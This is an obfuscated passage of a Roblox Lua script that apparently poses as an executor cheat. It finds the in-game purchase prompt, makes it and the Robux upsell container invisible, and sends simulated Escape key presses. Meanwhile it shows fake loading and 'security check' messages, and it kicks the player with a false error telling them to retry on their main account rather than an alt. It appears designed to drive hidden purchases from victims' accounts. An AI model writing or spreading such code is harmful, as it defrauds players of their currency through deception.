                    local PurchasePromptApp = CoreGui2:FindFirstChild("PurchasePromptApp")
                    if PurchasePromptApp then
                        ProductPurchaseContainer = PurchasePromptApp:FindFirstChild("ProductPurchaseContainer")
                    end
                    task.wait(0.1)
                end
                u36(u138, 50, "Configuring environment...")
                while not Animator do
                    Animator = ProductPurchaseContainer:FindFirstChild("Animator")
                    task.wait(0.1)
                end
                while not Prompt do
                    Prompt = Animator:FindFirstChild("Prompt")
                    task.wait(0.1)
                end
                u36(u138, 70, "Checking security...")
                coroutine.wrap(function()
                    local v156 = nil
                    while true do
                        v156 = PurchasePrompt and PurchasePrompt:FindFirstChild("RobuxUpsellContainer")
                        if v156 then
                            break
                        end
                        task.wait(0.1)
                    end
                    v156.Visible = false
                    u37(u138)
                    game.Players.LocalPlayer:Kick("\n[DELTA/KRNL IS BUGGY WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) If you didn't execute anything before \n2) Use main account, alts will be detected (Used to bypass Anti-Cheat) \n3) Use different Executor & Try again.")
                end)()
                u36(u138, 80, "Preparing final steps...")
                local ProductPurchaseContainer3 = CoreGui2:FindFirstChild("PurchasePromptApp"):FindFirstChild("ProductPurchaseContainer")
                if ProductPurchaseContainer3 then
                    local Animator3 = ProductPurchaseContainer3:FindFirstChild("Animator")
                    if Animator3 then
                        local Prompt2 = Animator3:WaitForChild("Prompt")
                        if Prompt2 then
                            Prompt2.Visible = false
                            local v148 = CoreGui2:FindFirstChild("RobloxGui") and CoreGui2.RobloxGui:FindFirstChild("SettingsClippingShield")
                            if v148 then
                                v148.Visible = false
                            end
                            task.wait(1)
                            u36(u138, 90, "Almost there...")
                            local u149 = u25()
                            if u149 < 25 then
                                u37(u138)
                                game.Players.LocalPlayer:Kick("\n[DELTA/KRNL IS BUGGY WITH THIS SCRIPT]\nScript Failed To Load!\nCheck the following- \n1) If you didn't execute anything before \n2) Use main account, alts will be detected (Used to bypass Anti-Cheat) \n3) Use different Executor & Try again.")
                                return
                            end
                            local VirtualInputManager = game:GetService("VirtualInputManager")
                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
                            task.wait()
                            VirtualInputManager:SendKeyEvent(true, Enum.KeyCode.Escape, false, game)
                            u30()
                            u36(u138, 100, "Initialization complete!")
                            task.wait(0.5)
                            u37(u138)
                            coroutine.wrap(function()
                                while true do
                                    if not Animator3:FindFirstChild("Prompt") and not u28 then
                                        u33(u149)
                                    end
                                    task.wait(0.5)
                                end
                            end)()
                            u33(u149)
                        else
                            u37(u138)
                            print("err1")
                        end
                    else
                        u37(u138)
                        print("err2")
                    end
                else
                    u37(u138)
                    print("err3")
                end
            end)()
        end)()
    else
        warn("Error: " .. result)
    end
    game.Players.LocalPlayer.OnTeleport:Connect(function()
        _G.scriptExecuted = nil
    end)
    return
end
warn("You have already executed this code.")
